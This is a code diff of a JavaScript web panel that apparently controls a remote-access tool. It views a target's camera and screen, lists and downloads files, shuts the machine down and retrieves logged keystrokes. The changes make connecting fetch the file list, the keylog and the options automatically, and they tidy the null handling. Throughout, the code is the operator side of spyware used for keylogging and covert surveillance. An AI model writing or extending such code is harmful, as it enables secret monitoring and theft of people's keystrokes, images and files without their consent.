@@ -19,14 +19,17 @@ function validateIp(ip) {
 function connect(type = "both") {
     if (type === "both") {
         type = ["camera", "screen"];
+        let statusElement = document.getElementById("status");
+        statusElement.textContent = "🟡";
+
+        checkStatus();
+
+        ls();
+        keylog();
+        getOptions();
     } else {
         type = [type];
     }
-
-    let statusElement = document.getElementById("status");
-    statusElement.textContent = "🟡";
-
-    checkStatus();
 
     let random = `?_=${Date.now()}`;
 
@@ -190,13 +193,13 @@ function download(path, file) {
 }
 
 function listFiles(response) {
-    let status = response.status;
-    if (status !== "ok") {
+    let filesElement = document.getElementById("files");
+    filesElement.replaceChildren("");
+
+    if (!response) {
         return;
     }
 
-    let filesElement = document.getElementById("files");
-    filesElement.replaceChildren("");
     let files = response.files;
     let folders = response.folders;
     let parent = response.parent;
@@ -234,8 +237,9 @@ async function ls() {
 
     let response = await fetch(url)
         .then((response) => response.json())
-        .then((response) => listFiles(response))
         .catch((error) => log(`${error}`, "error"));
+
+    listFiles(response);
 }
 
 function shutdown() {
@@ -273,13 +277,13 @@ async function keylog() {
         .then((response) => response.json())
         .catch((error) => log(`${error}`, "error"));
 
+    keylogElement.replaceChildren("");
+
     if (!response) {
         return;
     }
 
     let lines = response.keylog;
-
-    keylogElement.replaceChildren("");
 
     for (let i in lines) {
         let line = lines[i];
@@ -353,13 +357,13 @@ async function getOptions() {
         .then((response) => response.json())
         .catch((error) => log(`${error}`, "error"));
 
+    optionsElement.replaceChildren("");
+
     if (!response) {
         return;
     }
 
     let options = response.options;
-
-    optionsElement.replaceChildren("");
 
     for (let option in options) {
         let optionElement = document.createElement("div");
